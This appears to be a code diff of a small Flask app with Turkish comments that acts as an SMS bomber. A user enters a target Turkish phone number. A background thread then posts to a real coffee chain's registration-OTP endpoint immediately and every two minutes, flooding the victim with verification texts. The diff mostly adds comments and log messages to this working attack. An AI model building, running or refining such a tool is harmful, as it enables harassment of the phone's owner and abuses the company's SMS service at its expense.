@@ -6,19 +6,21 @@ from flask import Flask, render_template_string, request, redirect, url_for
 
 app = Flask(__name__)
 
+# Sistem durumunu hafızada tutan değişkenler
 state = {
     "phone": "",
     "active": False
 }
 
 def render_log(msg):
-    print(f"[LOG] {time.strftime('%H:%M:%S')} - {msg}", flush=True)
+    """Log çıktılarını temiz bir şekilde Render paneline (Tail Logs) basar"""
+    print(f"[SYSTEM LOG] {time.strftime('%H:%M:%S')} - {msg}", flush=True)
 
 def send_otp():
+    """Orijinal hedef uç noktaya istek atan ana fonksiyon"""
     if not state["active"] or not state["phone"]:
         return
     
-    # Replit projesindeki orijinal endpoint ve veri yapısı
     url = "https://www.kahvedunyasi.com/api/v1/auth/register-otp"
     payload = {"mobile_number": state["phone"], "country_code": "90"}
     headers = {
@@ -27,23 +29,27 @@ def send_otp():
     
     try:
         res = requests.post(url, json=payload, headers=headers, timeout=10)
-        render_log(f"İstek Durumu: {res.status_code}")
+        render_log(f"İstek Sonucu (Status Code): {res.status_code}")
     except Exception as e:
-        render_log(f"Bağlantı hatası gerçekleşti")
+        render_log(f"Bağlantı hatası gerçekleşti, istek iletilemedi: {e}")
 
 def worker():
+    """24 saat boyunca her 2 dakikada bir arka planda çalışacak motor döngüsü"""
     while True:
         if state["active"] and state["phone"]:
+            # İlk istek arayüz tetiklemesiyle anında atıldığı için döngü 120 saniye bekleyerek başlar
             time.sleep(120)
             if state["active"] and state["phone"]:
+                render_log("2 dakikalık periyot doldu, yeni döngü tetikleniyor...")
                 send_otp()
         else:
             time.sleep(1)
 
+# Arka plan thread kontrolü (Aynı işçinin mükerrer başlamasını engeller)
 if not any(t.name == "OTPWorker" for t in threading.enumerate()):
     threading.Thread(target=worker, name="OTPWorker", daemon=True).start()
 
-# Sadece numara girişi, buton ve altındaki minik yazı
+# --- ULTRA SADE VE ŞIK TASARIM (UI) ---
 HTML_TEMPLATE = """
 <!DOCTYPE html>
 <html lang="tr">
@@ -80,8 +86,9 @@ def index():
         if len(p) == 10 and p.isdigit():
             state["phone"] = p
             state["active"] = True
-            render_log(f"Yeni hedef: +90{p}")
-            # Butona basıldığı an ilk istek sıfırıncı saniyede gider
+            render_log(f"Sistem Tetiklendi -> Hedef Numara: +90{p}")
+            
+            # SIFIRINCI SANİYEDE ANINDA İLK SMS TETİKLEMESİ
             send_otp()
         return redirect(url_for('index'))
 
